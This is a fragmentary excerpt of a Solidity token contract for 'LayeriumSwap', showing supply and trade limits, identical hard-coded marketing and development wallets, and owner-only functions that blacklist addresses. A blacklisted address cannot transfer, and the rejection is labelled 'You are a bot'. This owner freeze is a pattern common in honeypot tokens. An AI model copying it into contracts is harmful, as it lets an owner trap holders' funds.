...
// LayeriumSwap-LS // Next Gen DEX Layer 2 For Existing EVM

   //https://t.me/LayeriumSwap
...
library Address{
 ...
 contract LayeriumSwap is Context, IERC20, Ownable {
    ...
    uint256 private initialsupply = 380000000;
	uint256 private _tTotal = initialsupply * 10 ** _decimals; 
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public swapTokensAtAmount = 100000 * 10**9;
    uint256 public maxBuyLimit = 380000000 * 10**9;
    uint256 public maxSellLimit = 380000000 * 10**9;
    uint256 public maxWalletLimit = 380000000 * 10**9;
    
    uint256 public genesis_block;
    
    address public marketingWallet = 0x946003b7abBf7b66290b4226793f3f9fe7f49414;
    address public developmentWallet = 0x946003b7abBf7b66290b4226793f3f9fe7f49414;

    string private constant _name = "LayeriumSwap";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_isBlacklist[from] && !_isBlacklist[to], "You are a bot");
    ...
    function updateIsBlacklist(address account, bool state) external onlyOwner{
        _isBlacklist[account] = state;
    }
    
    function bulkIsBlacklist(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isBlacklist[accounts[i]] = state;
